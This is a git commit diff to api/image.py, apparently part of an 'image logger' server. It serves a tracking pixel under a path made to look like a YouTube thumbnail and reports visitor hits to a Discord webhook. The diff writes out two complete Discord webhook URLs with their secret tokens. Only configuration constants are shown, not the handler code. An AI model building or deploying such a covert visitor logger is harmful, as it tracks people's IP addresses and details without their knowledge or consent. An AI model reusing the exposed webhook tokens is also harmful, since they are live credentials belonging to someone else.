538a60a4af933d3ff389f8b13d2ba8ce44323c3c
Clouds2737 <kmorning1204@gmail.com>
2026-01-21 20:15:35 -0500

    Update Discord webhook and pixel path

--- api/image.py
+++ api/image.py
@@ -9,8 +9,8 @@ from email.utils import formatdate
 
 PORT = 8000
 LOG_FILE = "access.log"
-DISCORD_WEBHOOK = ("https://discord.com/api/webhooks/1398083193265062020/OL-nBYHkOjSi8Nf50TJ9vA4UTyT6dhNcSTlF6vc4B-UEgmf8nHtnvMzj7DGd8iLiZDjt")  # Add your Discord webhook URL here
-PIXEL_PATH = "/tracking_pixel.gif"
+DISCORD_WEBHOOK = ("https://discord.com/api/webhooks/1443324767980617882/GXXmd0rXo4ECeq4RWvt138La4wkcR-uaYXgQCiYZpS94IL35RptskAVq4TVIArwORrKS")  # Add your Discord webhook URL here
+PIXEL_PATH = "/https://i.ytimg.com/vi/mxrmrJXLN8M/hqdefault.jpg"
 PIXEL_DATA = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
 
 class TrackingHandler(BaseHTTPRequestHandler):
